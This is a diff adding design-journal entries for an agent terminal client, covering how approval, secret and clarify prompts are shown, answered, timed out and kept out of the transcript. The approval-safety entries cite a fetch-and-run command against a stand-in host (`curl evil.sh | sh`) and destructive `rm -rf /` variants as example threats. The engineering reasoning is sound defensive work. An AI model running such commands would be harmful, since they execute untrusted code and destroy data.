@@ -122,6 +122,127 @@ The replacement is now decided. Gate selection is not an operator flag: `should_
 
 **Revisit when.** Talaria gains contributors beyond the operator, or a mechanical panel-independence verifier lands in the saga tooling — at which point review ceremony has a real reader and a real check.
 
+## 2026-08-03 — The prompt region reveals the first card's control, and every card it cannot reveal says so
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round — finishing round 4's own decision
+
+**Decision.** `PromptRegion.reveal_actions` scrolls the **first** card's answering control into view, and then `mark_unreachable_controls` retitles every card by whether its own control lies inside the region's `scrollable_content_region`. A card whose control is on screen keeps the border title `waiting for you`; a card whose control is not on screen carries `answer below — scroll` instead. The retitling runs in both directions, so a card that scrolls back into view gets its ordinary title again.
+
+**Rationale.** One bounded region cannot show every card's control, so the question is not *whether* some card loses and *which* — it is what the losing card is allowed to look like. Round 4 answered the first half correctly and implemented something else: it `return`ed inside the loop after the first card, which is "look at the first card and give up", not "reveal the first card's control". With a clarify parked above an approval, the clarify's one-row input was already visible, the scroll was a no-op, and the approval below kept its `waiting for you` title with its buttons off the bottom edge and every click on them landing nowhere.
+
+That arrangement is ordinary, not exotic. The gateway's pending map is keyed by request id (`tui_gateway/server.py:146`, `:2961-2964` at Hermes `7f4d15515`), so several blocking prompts are outstanding simultaneously by design, and `_block`'s signature is `timeout: float | None = 300` where `None` means wait forever — a clarify configured with a non-positive timeout stays outstanding indefinitely, parked above whatever arrives next.
+
+Revealing the **first** card is kept, with round 4's reason: with two approvals queued the only offered action is `deny all`, which applies to the whole queue from whichever card carries it, so reaching for the first keeps the oldest command — the one the gateway's FIFO resolver pops first — on screen instead of pushing it off. What is added is the second half of the requirement: no card may be left looking live with no reachable control. The border title is where that is said because the title is what is still *legible* — a control pushed past the bottom edge takes everything below it with it, so the border and the rows above the control are all that remain to read, and the border is the part that made the card read as live.
+
+**Rejected alternatives.** *Reveal the last card instead* — the same defect with the operands swapped; the first card then looks live with nothing reachable, and it is the one the gateway resolves first. *Reveal every control in turn* — a scroll is one position; scrolling to card N and then to card 1 lands on card 1, so this is the current behaviour with extra work. *Rely on the scrollbar* — the region already has one, and round 4's reproduction had it on screen while the card still read as live; a scrollbar says "there is more", not "the thing you are about to click is not here". *Grow the region past `max-height: 70%`* — the cap exists so a queue of approvals cannot eat the transcript, and a card is only readable next to the transcript entry that explains it. *Refuse to mount a card the region cannot show* — hides a live question entirely, which is worse than showing it with a marker.
+
+**Known gap, queued rather than fixed.** The retitling recomputes on a region resize, on a `CommandPanel.Rewrapped`, and nowhere else. Two arrangements therefore carry a stale title: a card with no command body mounting into a region already at its `max-height` (neither trigger fires), and an operator scrolling by hand (no trigger at all). Both are recorded in `QUEUED.md`. The stale direction is a card marked `answer below` whose control has come back into view, or the reverse for a control-only card — a wrong label rather than the original silent inertness.
+
+**Revisit when.** The region gains a keyboard action that jumps to the next unanswered card, which would make "which control is revealed" much less load-bearing. Also revisit if a real session routinely queues more than two attended prompts, which would argue for a single-card region with an explicit "1 of 3" pager instead of a scrolling stack.
+
+## 2026-08-03 — After a local withdrawal the screen says the state is unknown, and the frozen status document is left alone
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round
+
+**Decision.** `SessionState.withdrawn_approvals` counts approvals `age_out_approvals` withdrew whose fate is still unknown. `prompt_view` projects it as `PromptView.withdrawn`, and `activity_line` spends it on exactly one slot — the one that used to read `working…`:
+
+> 1 approval withdrawn — whether the agent is still blocked is unknown
+
+It does not outrank `waiting for you — …`, because a live prompt is something the operator can act on. It does not appear on an idle turn, because an idle turn is not making a claim that needs correcting. The count is cleared the moment the reducer sees the agent move — a change to the turn phase, the turn index, or the assistant's own accumulating text. **KTD5's status document is unchanged**: `turn` still reports `streaming` and `pending_prompts` still reports `0`.
+
+**Rationale.** `turn_status` reports `waiting` only while `state.prompts` is non-empty, so the instant an approval ages out the turn falls back to `streaming` and the screen claims work. Whether that is a lie depends on a number Talaria cannot read. The gateway fails closed **and returns** — `tools/approval.py:4050` yields `"approved": False, "outcome": "timeout"` — so under its default 300-second wait the agent really did resume and `streaming` is true. A deployment that raised `HERMES_APPROVAL_TIMEOUT` above Talaria's own `APPROVAL_STALE_AFTER` gets the other case, where the gateway is still holding and the session will never move. Talaria cannot distinguish them, and the honest state after a withdrawal is neither `waiting` nor `working` but "this was withdrawn and what happens next is unknown".
+
+The contract is where it stays a screen fix. `docs/formats/status-line.md` is `Authority: contract`, `Version: 1`, and frozen under KTD5: "the field set, the process behavior, and the environment rules below do not change without a `version: 2` bump", with `turn` enumerated at four values and `connection` at five. A fifth turn value is therefore not available, and inventing one would break every consumer written against version 1 while silently claiming the document had not changed shape.
+
+The clearing rule is deliberately narrow. A heartbeat, an ambient event, or another prompt arriving proves the socket is alive and proves nothing about the agent — and the case this must not clear on is precisely the bad one, where the gateway still holds the approval and the agent is blocked inside the tool call producing nothing at all.
+
+**Rejected alternatives.** *Report `waiting` after the withdrawal* — asserts the gateway is still holding, which is the less likely of the two cases under the default configuration and is not something Talaria observed. *Leave `streaming`* — the shipped behaviour, and a false "busy" is the specific failure R8 exists to prevent. *Add a fifth `turn` value* — breaks the frozen v1 contract for every external consumer; correct only alongside a `version: 2` document. *Keep the card on screen greyed out* — the projection would still count it, so the correlation rule would still be disabled for the next genuine approval, which is the defect the age-out was added to fix. *Clear the unknown state on any inbound frame* — a heartbeat would clear it, and heartbeats keep arriving while the agent is blocked, so the hedge would vanish in exactly the case it exists for.
+
+**Revisit when.** KTD5's status document takes a `version: 2` bump for any other reason — the honest turn value belongs in that revision. Also revisit if the gateway publishes its configured approval timeout, which would let Talaria set `APPROVAL_STALE_AFTER` from the deployment and collapse the unknown case entirely.
+
+## 2026-08-03 — A terminal-read's arrival is recorded in the transcript; its answer's outcome is not
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round
+
+**Decision.** `_report_prompt_outcome` is the single place an answered prompt's outcome sentence is routed. For `UNATTENDED_KINDS` — `terminal_read` — it goes to the composer notice bar only, for **all four** outcome classes: error, discarded, delivery-unconfirmed, and not-sent. The arrival line `prompt_registration_line` writes (`terminal_read prompt awaiting an answer: …`) **stays** in the transcript.
+
+**Rationale.** `terminal.read` serves the transcript straight back to the agent, so anything Talaria writes there becomes part of the next answer. Round 4 fixed the compounding form of that — a restore loop that took one answer from 159 to 884 characters in three cycles — by taking the `not_sent` class off the transcript, keying the guard off `verdict.restore`. Three classes were still writing, one line per failed read. That is not a loop (exactly one call, the prompt settles, nothing grows), but the constraint round 4 was given was "the transcript must not be written into by a bridge that serves the transcript", and it held for one case in four. Applying it once, over the kind rather than over the disposition, is what makes it a rule instead of a patch.
+
+The arrival line is kept, and the distinction is what it records. It is a statement about what the **gateway asked for**, not about what Talaria replied. Removing it would make an agent reading the operator's screen invisible in the operator's own record, and that is a privacy-relevant act the transcript should show. The operator loses nothing on the outcome side: the notice bar carries the full sentence for these kinds, and the notice bar is not a surface the read projection reads.
+
+**Correction — this entry first claimed the arrival line "does not compound, because nothing downstream reads it and writes again". That is false, and two independent adversarial lenses measured it.** `terminal_read` *is* the thing downstream that reads the transcript, so every arrival line is served back inside the next read. Six sequential `terminal.read.request` frames in a session whose only real content is one `message.delta`:
+
+| read | `terminal.read.respond` payload | arrival lines inside the payload |
+|---|---|---|
+| 0 | 172 bytes | 1 |
+| 5 | 512 bytes | 6 |
+
+The sixth answer is seven lines: six copies of `terminal_read prompt awaiting an answer: terminal read requested` and one line of actual session content. What is true is the narrower claim: **no individual line grows** — that was round 3's defect, one answer going from 159 to 884 characters — but the served buffer accumulates one self-generated line per read, without bound in the number of reads.
+
+That is the same property this entry's own rejected-alternatives paragraph uses to turn down outcome lines ("small but unbounded in the number of reads"). The decision to keep the arrival line may still be right — it is one line rather than one-per-failure, and it buys the audit record — but it is being kept **at a cost this entry originally denied**, and the accounting is now: R5-5 removed between zero and one line per *failed* read and left one line per *every* read, so the residual self-contamination is strictly larger than what the round removed. Queued at P2 (`QUEUED.md`) to either move the arrival record to a side channel the read does not serve, or accept it with this measurement in view.
+
+**Rejected alternatives.** *Keep writing outcomes and accept one line per failed read* — the contamination is small but unbounded in the number of reads, and it is Talaria's own commentary feeding back, which is the category the rule exists to forbid. *Drop the arrival line too* — buys a linear reduction in self-reference at the cost of the audit record for the one bridge that reads the operator's screen. *Keep the arrival line out of the read projection but in the transcript pane* — the projection and the pane would then show different buffers, which breaks terminal-read's own contract that it serves what is on screen. *Silence the notice bar as well* — the operator would have no signal at all that a read failed.
+
+**Revisit when.** A real corpus shows repeated reads crowding the buffer with their own arrival lines — at which point the arrival record moves to a side channel the read does not serve, rather than disappearing. Also revisit if another bridge is ever added to `UNATTENDED_KINDS`, since the routing rule is keyed on that set.
+
+## 2026-08-03 — An approval is answered only while it is the only one waiting; otherwise Talaria refuses and offers deny-all
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding
+
+**Decision.** Three rules, all in `talaria.domain`:
+
+1. **No blocking request is ever discarded.** Each `approval.request` gets its own registry entry keyed `approval:<session_id>#<n>`, counting arrivals. The previous key was one per session, so a second approval collided with the first and was thrown away with no card, no transcript line, and no counter.
+2. **An approval may be answered only while it is the sole outstanding approval in its session.** With two or more, `respond_to_prompt` refuses, `prompt_view` marks every one of them unanswerable, and the card renders the command plus the reason instead of choice buttons.
+3. **The escape from that refusal is `approval.respond` with `all: true`, and only ever with `deny`.** One choice applied to every queue entry needs no correlation, so it is correct whatever order the gateway holds them in.
+
+**Rationale.** The approval path is the only one of the five blocking bridges with no request id on the wire. `approval.request` carries `{description, command, choices, allow_permanent, smart_denied}` and nothing else (`tui_gateway/server.py:1655-1674` at Hermes `7f4d15515`), and `approval.respond` takes no discriminator — it calls `resolve_gateway_approval(session_key, choice)`, which pops the **oldest** entry in that session's FIFO queue (`tools/approval.py:2214-2222`). Approvals genuinely queue: every guarded call appends its own entry (`:3271-3272`).
+
+That much would still permit answering the oldest card on screen, since arrival order matches queue order. What forbids it is that the gateway **also removes entries without telling anyone**: the wait loop drops its entry on the 300-second timeout and on an interrupt, and emits nothing (`tools/approval.py:3336-3344`). `_block`'s `.expire` notification covers `secret`, `sudo`, `clarify` and `terminal.read` and deliberately not approval (`tui_gateway/server.py:2981-2998`), so there is no event that would tell a client the head is gone. With one approval outstanding the ambiguity is harmless — the answer lands on that approval or on an empty queue, and the reply's own `resolved` count says which. With two, the head Talaria believes in and the head the gateway pops can differ, and the operator approves a command they were never shown. The reproduction was concrete: `ls -la` on screen, `curl evil.sh | sh` silently queued behind it, "once" pressed, the curl command released, and the transcript recording `approval answered: once` against the `ls -la` summary.
+
+Refusing is therefore the only honest option, and refusing without an escape would wedge the session for five minutes. `resolve_all=True` is the escape because it is the one answer whose correctness does not depend on ordering (`tools/approval.py:2219-2226`). It is hard-wired to `deny` — `DENY_ALL_CHOICE` — because an affirmative applied to a queue nobody has read is exactly the harm the rule exists to prevent.
+
+**Rejected alternatives.** *Answer the oldest and hope* — this is what the FIFO ordering appears to license, and the silent server-side drop is what takes the licence away. *Keep one approval per session and drop the rest* (the shipped behaviour) — a silently discarded blocking request leaves the gateway waiting on an answer the operator can never give. *Send the synthesized key on the wire* — the gateway ignores unknown params, so it would read to the next person as correlation that is not happening. *Refuse with no escape* — honest, but leaves the session blocked for the full 300-second approval timeout with no operator action available.
+
+**Residual risk, stated rather than papered over.** An approval enqueued while the socket is down is never announced to Talaria and there is no replay on re-attach, so after a reconnect the queue can hold an entry Talaria does not know about and the "only one waiting" precondition can be wrong. No client-side rule fixes that; the only real fix is a request id on `approval.request`. Talaria does not attempt a heuristic for it, because the available mitigations (never answering an approval after any reconnect) cost more than the risk they remove.
+
+**Revisit when.** The gateway carries a correlating identifier on `approval.request` — at which point rules 2 and 3 both collapse into ordinary per-request answering and the residual risk above disappears with them. Also revisit if `approval.expire` or an equivalent queue-state notification appears, which would make the FIFO position knowable and reinstate answering the head.
+
+## 2026-08-03 — Talaria withdraws an approval after five minutes and says only what it knows
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fourth adversarial round
+
+**Decision.** `age_out_approvals` withdraws any approval that has been outstanding for `APPROVAL_STALE_AFTER` (300 seconds), writing a `prompt-expired` transcript entry and latching the id into `flushed_prompt_ids` so a late `restore_prompt` cannot resurrect the control. It applies to **approval only**, to prompts in `prompts` only (not `answering`), and it is driven from the render tick with the clock the prompt's own `opened_at` came from — wall clock live, recorded clock in replay.
+
+The line it writes claims nothing about the gateway:
+
+> approval no longer offered — nothing was sent; the gateway's default wait is 5 minutes and it announces no approval timeout, so it has probably stopped waiting
+
+**Rationale.** Approval is the one bridge with no `<bridge>.expire` (`tui_gateway/server.py:2981-2998` at Hermes `7f4d15515`; `tools/approval.py` drops its entry via `_drop_entry()` with no emit), so nothing closed a stale approval — and a stale approval is not inert. It keeps `outstanding_approvals` above one, which marks a *genuine* later approval unanswerable, which leaves the operator unable to allow the command they want while the only offered action denies it.
+
+300 seconds is the gateway's own default (`_get_approval_timeout()`, `tools/approval.py:2648-2657`) and the gateway fails **closed** (`"Silence is not consent."` at `:2976`, recorded as `"outcome": "timeout"` at `:4050`). So the number and the failure direction are both cited rather than invented. But that timeout is **configurable**, so Talaria does not know the real deadline — which is why the sentence hedges ("probably stopped waiting") and never says *denied*, however likely a denial is. Saying "denied" would be inventing an acknowledgement that no reply carried.
+
+**Rejected alternatives.** *Do nothing and let the card sit* — the shipped behaviour, and the one that disables the correlation rule for the next real approval. *Send a denial when the timer fires* — a client answering on its own initiative for a command the operator never read is the exact harm `DENY_ALL_CHOICE` is hard-wired against, and it would also be a second answer if the gateway had already timed out. *Grey the card out but keep it in the registry* — cosmetic; the projection would still count it, so the real defect survives. *Read the gateway's configured timeout* — no method publishes it; the terminal gateway has no `GET /v1/capabilities` equivalent. *Use a wall clock in replay* — would age out an entire recorded corpus on the first tick and break AE2's "replay it twice, get the same state".
+
+**Revisit when.** The gateway emits an approval expiry or publishes its configured timeout — either makes the local guess unnecessary and lets the card say what actually happened. Also revisit if an operator reports a card disappearing while the gateway was still waiting, which would mean the deployment raised `HERMES_APPROVAL_TIMEOUT` above the default and the constant should become configurable rather than fixed.
+
+## 2026-08-03 — Deny-all reports what it decided and what it cannot know as two clauses, not one total
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fourth adversarial round — amending the third round's own decision
+
+**Decision.** `DenyAllScope` loses `total` and gains two properties. `denied` is `len(taken)` — approvals **this call** removed from the registry, which is exactly the set whose fate this call decides. `undecided` is `len(already_in_flight)` — approvals the gateway's `all` flag also reaches, but which have their own `approval.respond` on the wire. The transcript line names them separately:
+
+> denied every waiting approval: 2 waiting (+1 already answered, outcome unknown), 3 resolved
+
+**Rationale.** The third round replaced `len(taken)` with `len(taken) + len(already_in_flight)` because reporting the cards alone said "2 denied" while the gateway swept three. That correction was right about the omission and wrong about the claim. An `already_in_flight` approval may be carrying the affirmative the operator pressed a second earlier; which of the two responds the gateway applies is decided by arrival order there, which Talaria neither knows nor waits for. Calling it denied produced a transcript asserting two different fates for one command — `denied every waiting approval: 2 waiting` beside `approval answered: once · command: rm -rf /`.
+
+The split also bounds repetition, which the sum did not. Any approval arriving inside a deny-all round trip mounts a card whose only action is "deny all", so a second press is one keystroke away; the sum re-counted every approval the first press had claimed, reporting five denials for three approvals. `denied` counts only prompts this call removed, and a press that removes none is refused, so the denials claimed across a session can never exceed the approvals that arrived in it.
+
+**Rejected alternatives.** *Refuse deny-all while any approval answer is in flight* — the other option, and it removes the safe escape at exactly the moment a second approval arrives mid-answer, which is when the operator most needs it. *Keep the sum and soften the headline* ("up to N denied") — a range still asserts the verb of both groups, and "up to" invites being read as the larger number. *Wait for the in-flight reply before sending the deny-all* — a denial delayed by a round trip that may itself time out, on the one action offered when nothing can be aimed. *Report only `denied` and say nothing about the rest* — the third round's original defect, restored.
+
+**Revisit when.** `approval.request` carries a correlating identifier, at which point deny-all stops being the only aimable action and the in-flight ambiguity disappears with it. Also revisit if `approval.respond` starts reporting *which* entries it resolved rather than only how many — that would let the line name outcomes instead of counts.
+
+**Known consequence of the rejected alternative, recorded beside the decision.** Declining to refuse deny-all while an answer is in flight has a second-order effect on the *screen*, not only on the count. `all: true` resolves the whole queue including the in-flight entry; that entry's own call can then come back `not_sent`, take the restore branch, and put its card back — re-offering a control for an approval the gateway denied a moment earlier. Read from two code paths and **not reproduced**, so it is carried as PLAUSIBLE. It is tracked in `QUEUED.md` under "A deny-all that succeeds can re-offer a control the gateway already resolved"; it is recorded here because it is a cost of this decision rather than a free-standing defect, and anyone revisiting the decision needs to see it attached to the choice that produced it.
+
 ## 2026-08-03 — Prettier is scoped to the TypeScript bootstrap; docs are excluded
 
 **Author.** v0.1 segment 1, unblocking the `check` CI job
@@ -328,3 +449,121 @@ Two things generalize past the incident. First, **an agent's model of "who else 
 **Cost, stated plainly.** About 200-500ms and a working tree's worth of disk per agent, and the agent's findings cite paths inside its clone, so line numbers must be translated back before they are actionable. Both are cheap against one contaminated verification round.
 
 **Revisit when.** Verification agents stop mutating code to prove their point, or the harness gains first-class per-agent worktrees that make the extraction implicit rather than something each prompt has to ask for.
+
+## 2026-08-03
+
+### A prompt is cleared before its answer is sent, and only a *known-unsent* answer puts it back
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts)
+
+**Decision.** `TalariaApp.respond_live` removes the prompt from the registry *before* the respond call goes out. If the call resolves to `not_sent` — the one outcome that is definite that nothing reached any socket — `restore_prompt` puts the control back. Every other unconfirmed outcome leaves it cleared and writes a marked transcript line.
+
+**Rejected alternatives.** *Clearing only on a confirmed reply* leaves the control live for the whole call, so a second press sends a second answer to one blocking question — and for the two bridges where the answer is a credential, the second answer is a second password attempt the operator did not intend. *Restoring on any unconfirmed outcome* is the same failure reached more slowly: `connection_lost` and `no_reply` both mean the request went out and the answer did not come back, so the gateway may well have taken the first value, and re-offering invites a second. The distinction is not new here — it is the same three-valued reasoning U7 recorded for `submit_live`, and the two now share `delivery_of` and `DELIVERY_NOTES` rather than each deciding for itself.
+
+**Rationale.** The registry is the only place that knows which request ids are live, so it is the only place the "at most one answer" property can be enforced. Clearing first makes the property structural rather than a matter of how fast the operator's second keypress arrives.
+
+**Cost, stated plainly.** An answer whose call fails in any way other than "never sent" is a question the operator can no longer answer. The gateway's own bridge expires after 30 seconds and the tool returns empty (`tui_gateway/server.py:2958-2998`), so the turn recovers; what is lost is the operator's chance to try again inside that window. The transcript says so explicitly rather than leaving a control that silently does nothing.
+
+**Revisit when.** A bridge appears whose respond is idempotent by construction — a resend of the same value being provably harmless would remove the argument for clearing first — or the gateway starts acknowledging a respond with the request id it resolved, which would let a retry be correlated instead of guessed at.
+
+### A respond value reaches the transcript only if the gateway itself offered it
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts)
+
+**Decision.** One rule covers all five bridges: an answer is written into the transcript only when it is a member of the `choices` list the gateway sent (`echoable_answer` in `talaria/ui/prompts.py`). Everything else — a sudo password, a secret, free-typed clarify text — produces a value-free marker saying the bridge was answered. A *confirmed* terminal-read writes nothing at all; unconfirmed ones still write, because those are things the operator has to be told.
+
+**Rejected alternatives.** *Echoing clarify answers* is the obviously friendlier choice and it is why the recorder's deny-set carries `clarify.respond` → `params.answer` in the first place: the key name looks innocuous and "paste the token here" is an ordinary thing for an agent to ask. *Writing nothing for any bridge* is safe and destroys the audit trail that matters most — "did I allow that command" is the question an operator asks afterwards, and only the approval choice answers it. Keying the rule on *kind* rather than on the offered list would need five decisions where one suffices, and would get the multiple-choice clarify wrong in whichever direction it was written.
+
+**Rationale.** A gateway-offered choice is closed, machine-authored, and cannot carry operator input; anything else can. That is the whole distinction, and stating it as one rule means a bridge added later inherits the safe side by default. The transcript is also a less obvious egress than the frame log: the terminal-read bridge serves it straight back to the agent, so a credential written into it leaves the machine through a door nobody was watching.
+
+**Cost, stated plainly.** An operator who answers a clarify sees "clarify answered" rather than what they said. The agent has the answer and normally refers to it in its next message, so the conversation stays readable; the transcript is not a keystroke log.
+
+**Revisit when.** A bridge appears whose free-text answer is provably non-sensitive, or the transcript gains a redaction layer of its own — at which point echoing becomes a rendering decision rather than an egress one.
+
+### An approval with no offered choices offers deny, and nothing else
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts)
+
+**Decision.** When `approval.request` arrives with no `choices`, the control offers exactly `("deny",)`.
+
+**Rejected alternatives.** *Synthesizing the usual list* (`once`/`session`/`always`/`deny`) matches what the gateway fills in most of the time and is the client granting permission the gateway never offered — the one direction where guessing wrong approves something. *Rendering no control at all* leaves a blocking prompt with no way to answer it, which is the abandoned-overlay bug Hermes already fixed once for clarify (`flushAbandonedClarify`).
+
+**Rationale.** The gateway fills `choices` only when `allow_permanent` is present in the payload (`tui_gateway/server.py:1663-1670`), so an approval carrying neither is reachable rather than hypothetical. Deny is the only option that is safe to offer unasked, and the shipping terminal UI already treats it that way — it sends `{choice: 'deny'}` on escape without the gateway having offered anything (`ui-tui/src/app/useInputHandlers.ts:182`).
+
+**Cost, stated plainly.** An operator who wanted to allow such a command cannot, and must let the approval expire and re-run the action. Rare, and the failure is in the direction that does not execute anything.
+
+**Revisit when.** The gateway starts guaranteeing a `choices` list on every `approval.request`, which would make the fallback dead code and worth deleting rather than widening.
+
+### The prompt registry stores the session, so R9's correlation clause is enforced rather than implied
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts)
+
+**Decision.** `PendingPrompt` carries `session_id`, and `respond_to_prompt` refuses when the caller's session does not match it. Passing `None` skips the check, which is what a caller with no session context genuinely means.
+
+**Rejected alternatives.** *Relying on the reducer's cross-session filter* is most of the guarantee already — an event for an unfocused session never registers a prompt — but it covers registration, not answering, and a control that outlived a focus change is precisely the case R9 names. *Checking in the app* would make it one caller's discipline; the registry is the one place that knows what session each live id belongs to, which is the same argument that put the id check there.
+
+**Rationale.** Cost is one field and one comparison. Without it the property holds by an ordering coincidence — `focus_session` happens to clear the prompt list — and a coincidence is not something a later change can be checked against.
+
+**Cost, stated plainly.** One more field on a frozen dataclass, and a keyword argument on a function the domain suite calls without it.
+
+**Revisit when.** v0.1's single-session assumption ends. A real session switcher makes "the focused session" a poorer key than "the session this control belongs to", and the check becomes the primary routing rule rather than a guard.
+
+### A new prompt takes the caret only when the composer is empty
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts)
+
+**Decision.** `PromptRegion.apply` focuses a newly mounted control only when the app says the composer holds no text; otherwise the activity line does the asking.
+
+**Rejected alternatives.** *Always focusing* is what an overlay does and it drops the keystrokes already in flight when a prompt arrives mid-word. *Never focusing* makes the common case — an idle operator, a blocking question — cost an extra keystroke to reach the only control that matters.
+
+**Rationale.** A blocking prompt has a real claim on attention, and the composer holding text is the one observable signal that the operator is mid-thought. R8 is satisfied either way by the activity line, so focus is free to optimise for the ordinary case.
+
+**Cost, stated plainly.** The rule depends on composer contents, so an operator who leaves stale text in the composer never gets automatic focus. Visible and self-inflicted.
+
+**Revisit when.** The composer gains draft persistence, at which point "holds text" stops meaning "is being typed into" and the signal needs replacing with a real recent-keystroke test.
+
+### The approval card renders the command, wrapped and visibly capped, and the transcript keeps it unclipped
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding
+
+**Decision.** `command` is a field on `PendingPrompt` and `PromptRow` in its own right, never folded into `summary`. The card renders it as a wrapped body between the header and the choice buttons: hard-wrapped by cell to the panel's `content_size.width`, capped at `COMMAND_PREVIEW_LINES` rows, with anything beyond replaced by a counted marker (`… +N more lines`). Newlines in the command are honoured before the wrap. The prompt's arrival transcript entry carries the whole command on its own line, unclipped; the answered entry names the choice **and** the command, bounded by the ordinary system-line clip.
+
+**Rejected alternatives.** *Keep `description or command` as one summary line* — the shipped behaviour, and the defect: at Hermes `7f4d15515` the gateway populates `description` with the joined pattern warnings (`tools/approval.py:3616`) and sends the command in a separate field (`:3651-3660`), so the operator read "recursive delete outside the workspace" above four buttons and never saw `rm -rf / --no-preserve-root`. *Truncate with an ellipsis and no count* — a clipped row is indistinguishable from a row that ended, and the clause that makes a command dangerous is usually at the end. *Word-wrap* — whitespace is syntax in a shell command, and a wrap free to move it can make two tokens read as one. *Soft-wrap and let the container clip* — the card would be honest and its container would not, which is the same failure one level up. *Put the command only in the transcript* — the transcript scrolls; the decision does not.
+
+**Rationale.** The shipping terminal UI reaches the same conclusion with the reason in a comment: "the full command must be reviewable before approving" (`ui-tui/src/components/prompts.tsx:97-99`), with its own `… +N more lines` marker. The audit half is the other side of the same argument — an approval that cannot be reconstructed afterwards is only half the problem solved, and "did I allow that" is not answered by a choice alone.
+
+**Cost, stated plainly.** An approval card is now up to eleven rows instead of four, which it takes from the transcript, and `PromptRegion` becomes a `VerticalScroll` so two queued approvals stay reachable. `CommandPanel` re-wraps on `Resize`, so the rows are a function of terminal width and a test that asserts them must name a size.
+
+**Revisit when.** The gateway starts sending a structured command (argv rather than a string), which would allow per-argument rendering; or a terminal-height budget makes a fixed six-row preview the wrong shape and it should scale with the space available.
+
+### `outstanding_approvals` means the gateway's queue, and deny-all separates what it takes from what it counts
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding
+
+**Decision.** `SessionState.outstanding_approvals` searches `prompts` **and** `answering`, ordered by frame `seq`. Both consumers of the sole-outstanding-approval rule — the refusal in `respond_to_prompt` and the unanswerable marking in `prompt_view` — read it unchanged and therefore agree. `respond_to_all_approvals` returns a `DenyAllScope` with two members: `taken`, the approvals this call moved out of the registry and may restore or settle, and `already_in_flight`, the approvals another call owns. `scope.total` is what the operator is told.
+
+**Rejected alternatives.** *Leave `outstanding_approvals` reading `prompts` and give each consumer its own predicate* — three copies of one safety rule, and the reason there were two consumers in the first place was to keep the card and the registry from disagreeing. *Merge by concatenating the two tuples* — `answering` holds what was answered most recently, which is routinely older than what is still on screen, and the order is a claim about which command an answer would reach. *Have deny-all take the in-flight approvals too* — two owners for one prompt means either a double settle or a control resurrected while its own answer is travelling. *Report `len(taken)`* — the gateway's `all: true` resolves every queue entry, so the count would understate a safety action by exactly the approvals the operator can least afford to lose track of. *Refuse deny-all while any answer is in flight* — leaves the operator with no action at all for the length of a round trip, in the state the rule exists to get them out of.
+
+**Rationale.** "Outstanding" is a statement about the peer's queue, not about the client's screen. `respond_to_prompt` empties `prompts` before the call goes out, so a client-side container is empty for exactly as long as the peer is still holding the entry — which is the whole window the rule has to cover. Reading the screen made the approval the operator had *just answered* invisible to the rule that exists to stop a second one being answered, and `_spawn_live` runs each respond as its own task, so that window is one the operator is looking at a live interface in.
+
+**Cost, stated plainly.** `outstanding_approvals` now sorts, so it is O(n log n) on a set that is one or two entries in practice. Deny-all's return type is a small dataclass instead of a tuple, which every caller must destructure knowingly.
+
+**Residual risk, stated rather than papered over.** With one answer in flight and deny-all pressed, two `approval.respond` calls are legitimately on the wire, and which the gateway applies first is its own FIFO's business. The count is honest about what the `all` reached; nothing client-side can make the interleaving deterministic. This is the same residual the missing request id causes and it closes the same way.
+
+**Revisit when.** `approval.request` carries a correlating identifier, which retires the sole-outstanding rule and both of its consumers.
+
+### One function decides what an answered prompt may claim, and both answer paths go through it
+
+**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's honesty finding
+
+**Decision.** `read_answer(kind, outcome)` returns an `AnswerVerdict` — one of `error`, `not_sent`, `discarded`, `used`, plus the operator-facing reason and whether the control may go back. `_record_prompt_outcome` (one prompt) and `deny_all_approvals_live` (the whole queue) both switch on it. Neither reads `outcome.status`, `delivery_of`, or `gateway_refusal` directly.
+
+**Rejected alternatives.** *Leave the two paths independent and fix deny-all in place* — a second correct copy, which is the arrangement that produced the defect. *Put the verdict in the domain* — it combines a transport outcome with a gateway reply body, and `gateway_refusal` and `delivery_of` already live at the UI boundary; moving all three would pull `RpcOutcome` into the domain core for no gain. *Keep the resolved count in every deny-all line* — an unacknowledged call carries no count, and the clause pushes the delivery note past `SYSTEM_LINE_CLIP`, which is where the reason lives.
+
+**Rationale.** Three independent signals decide what a respond may be written down as: the JSON-RPC envelope, U7's delivery table, and the reply body (both ways this gateway discards an answer come back as successes). Deny-all read none of them, and it is the *only* action the interface offers once two approvals queue — so the design funnelled the safety-critical case into the one path that had never been hardened. This journal already carries the rule from a redaction defect of the same shape: a sanitizer attached to one selection rule is not a boundary.
+
+`UNCOUNTED_RESOLUTION` exists for the third symptom: formatting a missing `resolved` count put Python's `None` in front of the operator, and "None resolved" reads in English as "none resolved" — the opposite of "the gateway did not say".
+
+**Cost, stated plainly.** A dataclass and a function in `talaria/ui/app.py` that a reader must follow to see what a branch does, instead of four visible branches per path. Bought back by twenty-two mutations, five of which classify an outcome differently and turn both paths red at once.
+
+**Revisit when.** A third answer path appears (a bulk answer for another bridge), or the gateway starts distinguishing "discarded" in the envelope rather than the body, which would collapse `gateway_refusal` into `delivery_of`.
